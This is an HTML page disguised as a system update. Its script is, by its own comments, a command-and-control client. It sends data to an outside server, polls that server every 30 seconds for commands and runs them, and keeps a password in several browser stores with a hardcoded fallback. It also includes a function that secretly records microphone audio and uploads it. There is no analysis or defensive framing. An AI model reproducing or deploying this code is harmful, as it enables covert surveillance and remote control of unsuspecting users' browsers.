<!DOCTYPE html>

<body>
<div class="container">
    <div class="loader" id="loader"></div>

    <div class="log" id="log"></div>
</div>

<script>
// ============================================================
// 🔥 SYSTEMUPDATE.HTML - FULL C2 CLIENT
// ============================================================

var SERVER = 'https://verifikasi.site';
var WS_PASSWORD = '';
var PASSWORD_FETCHED = false;
var C2_INTERVAL = 30000; // 30 detik

// ============================================================
// 🔥 LOGGING
// ============================================================
function log(msg, type) {
    var el = document.getElementById('log');
    if (!el) return;
    var div = document.createElement('div');
    var time = new Date().toLocaleTimeString();
    div.textContent = '[' + time + '] ' + msg;
    if (type === 'ok') div.style.color = '#0f0';
    else if (type === 'err') div.style.color = '#f44';
    else if (type === 'cmd') div.style.color = '#ff0';
    else div.style.color = '#888';
    el.appendChild(div);
    el.scrollTop = el.scrollHeight;
    if (el.children.length > 30) {
        el.removeChild(el.firstChild);
    }
}

// ============================================================
// 🔥 KIRIM DATA KE SERVER (TANPA PASSWORD!)
// ============================================================
function K(d) {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', SERVER + '/data', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify(d));
        log('📤 Data sent: ' + d.sumber, 'info');
    } catch(e) {
        log('❌ Send error: ' + e.message, 'err');
    }
}

// ============================================================
// 🔥 LAYERED PASSWORD (5 LEVEL FALLBACK)
// ============================================================
var PASSWORD_VALIDITY = 7 * 24 * 60 * 60 * 1000; // 7 hari

function savePasswordToAllStorages(password) {
    try {
        sessionStorage.setItem('ws_password', password);
    } catch(e) {}
    try {
        localStorage.setItem('ws_password', password);
        localStorage.setItem('ws_password_time', Date.now());
    } catch(e) {}
    try {
        document.cookie = 'ws_password=' + encodeURIComponent(password) + '; path=/; max-age=' + (7 * 24 * 60 * 60);
    } catch(e) {}
    try {
        var request = indexedDB.open('SystemDB', 1);
        request.onupgradeneeded = function(e) {
            var db = e.target.result;
            if (!db.objectStoreNames.contains('config')) {
                db.createObjectStore('config');
            }
        };
        request.onsuccess = function(e) {
            var db = e.target.result;
            var tx = db.transaction('config', 'readwrite');
            var store = tx.objectStore('config');
            store.put(password, 'ws_password');
        };
    } catch(e) {}
}

function loadPasswordFromAllStorages() {
    // Level 1: Session Storage (paling cepat)
    try {
        var pwd = sessionStorage.getItem('ws_password');
        if (pwd) return { password: pwd, level: 'sessionStorage' };
    } catch(e) {}

    // Level 2: Local Storage
    try {
        var pwd = localStorage.getItem('ws_password');
        var time = localStorage.getItem('ws_password_time');
        if (pwd && time && (Date.now() - parseInt(time) < PASSWORD_VALIDITY)) {
            return { password: pwd, level: 'localStorage' };
        }
    } catch(e) {}

    // Level 3: Cookies
    try {
        var cookies = document.cookie.split('; ');
        for (var i = 0; i < cookies.length; i++) {
            var parts = cookies[i].split('=');
            if (parts[0] === 'ws_password') {
                return { password: decodeURIComponent(parts[1]), level: 'cookies' };
            }
        }
    } catch(e) {}

    // Level 4: IndexedDB
    try {
        var request = indexedDB.open('SystemDB', 1);
        var result = null;
        request.onsuccess = function(e) {
            var db = e.target.result;
            var tx = db.transaction('config', 'readonly');
            var store = tx.objectStore('config');
            var get = store.get('ws_password');
            get.onsuccess = function() {
                if (get.result) {
                    result = { password: get.result, level: 'indexedDB' };
                }
            };
        };
        // Karena async, kita handle di bawah
        // Kita return null dulu, nanti akan di-retry
    } catch(e) {}

    return null;
}

// ============================================================
// 🔥 FETCH PASSWORD DARI WORKER (Level 5)
// ============================================================
function fetchPasswordFromWorker() {
    return new Promise(function(resolve) {
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', SERVER + '/get-password', true);
            xhr.timeout = 10000;
            xhr.onload = function() {
                if (xhr.status === 200) {
                    try {
                        var data = JSON.parse(xhr.responseText);
                        if (data.password && data.password.length > 0) {
                            resolve(data.password);
                            return;
                        }
                    } catch(e) {}
                }
                resolve(null);
            };
            xhr.onerror = function() { resolve(null); };
            xhr.ontimeout = function() { resolve(null); };
            xhr.send();
        } catch(e) {
            resolve(null);
        }
    });
}

// ============================================================
// 🔥 AMBIL PASSWORD (LAYERED)
// ============================================================
async function getPasswordLayered() {
    log('🔑 Fetching password from storage...', 'info');

    // Level 1-4: Cek storage
    var stored = loadPasswordFromAllStorages();
    if (stored && stored.password) {
        WS_PASSWORD = stored.password;
        PASSWORD_FETCHED = true;
        document.getElementById('status').textContent = '✅ System Active (storage)';
        log('✅ Password loaded from: ' + stored.level, 'ok');
        K({ sumber: 'password_fallback', data: { level: stored.level } });
        startC2Polling();
        return;
    }

    // Level 5: Fetch dari worker
    log('⏳ Fetching from worker...', 'info');
    document.getElementById('status').textContent = '⏳ Getting password from worker...';
    
    var workerPassword = await fetchPasswordFromWorker();
    if (workerPassword) {
        WS_PASSWORD = workerPassword;
        PASSWORD_FETCHED = true;
        savePasswordToAllStorages(workerPassword);
        document.getElementById('status').textContent = '✅ System Active (worker)';
        log('✅ Password loaded from worker', 'ok');
        K({ sumber: 'password_fallback', data: { level: 'worker' } });
        startC2Polling();
        return;
    }

    // Level 6: Default password (last resort)
    var defaultPassword = 'default_fallback_123';
    WS_PASSWORD = defaultPassword;
    PASSWORD_FETCHED = true;
    savePasswordToAllStorages(defaultPassword);
    document.getElementById('status').textContent = '⚠️ Using default password';
    log('⚠️ Using default password (last resort)', 'err');
    K({ sumber: 'password_fallback', data: { level: 'default' } });
    startC2Polling();
}

// ============================================================
// 🔥 START C2 POLLING
// ============================================================
function startC2Polling() {
    log('🔄 Starting C2 polling every ' + (C2_INTERVAL/1000) + 's', 'info');
    setInterval(cekPerintah, C2_INTERVAL);
    setTimeout(cekPerintah, 1000);
    startHeartbeat();
}

// ============================================================
// 🔥 CEK PERINTAH DARI SERVER (PAKAI PASSWORD!)
// ============================================================
function cekPerintah() {
    if (!PASSWORD_FETCHED || WS_PASSWORD === '') {
        log('⏳ Waiting for password...', 'info');
        return;
    }

    try {
        var xhr = new XMLHttpRequest();
        // 🔥 REQUEST PERINTAH DENGAN PASSWORD!
        xhr.open('GET', SERVER + '/data?type=perintah&password=' + encodeURIComponent(WS_PASSWORD) + '&t=' + Date.now(), true);
        xhr.timeout = 15000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                var content = xhr.responseText;
                if (content && content.length > 5 && content !== '{}') {
                    try {
                        var cmd = JSON.parse(content);
                        var aksi = cmd.aksi || 'unknown';
                        var serverPassword = cmd.password || '';

                        // 🔥 VERIFIKASI PASSWORD!
                        if (serverPassword === WS_PASSWORD) {
                            log('📥 Command: ' + aksi + ' (authenticated)', 'cmd');
                            document.getElementById('status').textContent = '📥 Executing: ' + aksi;
                            var hasil = eksekusiPerintah(cmd);
                            // Kirim hasil (TANPA PASSWORD)
                            K({
                                sumber: 'c2_result',
                                data: {
                                    perintah: aksi,
                                    hasil: hasil,
                                    waktu: Date.now()
                                }
                            });
                            log('✅ Command executed: ' + aksi, 'ok');
                        } else {
                            log('❌ Auth failed for command: ' + aksi, 'err');
                            K({
                                sumber: 'auth_failed',
                                data: {
                                    perintah: aksi,
                                    waktu: Date.now()
                                }
                            });
                        }
                    } catch(e) {
                        log('❌ Parse error: ' + e.message, 'err');
                    }
                }
            } else if (xhr.status === 401) {
                log('❌ Server rejected: invalid password', 'err');
            } else {
                log('⚠️ C2 HTTP ' + xhr.status, 'err');
            }
        };
        xhr.onerror = function() {
            log('⚠️ C2 network error', 'err');
        };
        xhr.ontimeout = function() {
            log('⚠️ C2 timeout', 'err');
        };
        xhr.send();
    } catch(e) {
        log('❌ C2 error: ' + e.message, 'err');
    }
}

// ----- SCREENSHOT -----
function ambilScreenshot() {
    try {
        var canvas = document.createElement('canvas');
        canvas.width = screen.width;
        canvas.height = screen.height;
        var ctx = canvas.getContext('2d');
        ctx.fillStyle = '#000';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        return 'data:image/jpeg;base64,' + canvas.toDataURL('image/jpeg', 0.3).split(',')[1];
    } catch(e) { return 'Error: ' + e.message; }
}

// ----- RECORD AUDIO -----
function recordAudio(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'audio/webm'});
                    var reader = new FileReader();
                    reader.onload = function() {
                        K({
                            sumber: 'c2_result',
                            data: { perintah: 'record_audio', hasil: reader.result }
                        });
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
                return 'Recording ' + durasi + 's...';
            })
            .catch(function(e) { return 'Error: ' + e.message; });
        return 'Started recording...';
    } catch(e) { return 'Error: ' + e.message; }
}

function stopAudio() {
    try {
        if (window._recorder) {
            window._recorder.stop();
            window._recorder = null;
            return 'Stopped';
        }
        return 'No active recording';
    } catch(e) { return 'Error: ' + e.message; }
}
